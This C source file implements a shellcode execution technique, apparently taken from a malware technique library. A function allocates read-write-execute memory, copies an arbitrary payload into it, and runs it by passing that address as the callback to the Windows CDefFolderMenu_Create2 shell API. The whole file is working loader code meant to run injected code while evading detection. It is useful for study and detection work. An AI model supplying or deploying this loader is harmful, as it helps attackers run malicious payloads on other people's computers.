#include "Win32Helper.h"

VOID InvokeCDefFolderMenu_Create2ThreadCallbackRoutine(LPVOID lpParameter)
{
	IContextMenu* ContextMenuRequired = NULL;
	CDefFolderMenu_Create2(NULL, NULL, 0, NULL, NULL, (LPFNDFMCALLBACK)lpParameter, 0, NULL, &ContextMenuRequired);
}

BOOL MpfSceViaCDefFolderMenu_Create2(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeCDefFolderMenu_Create2ThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}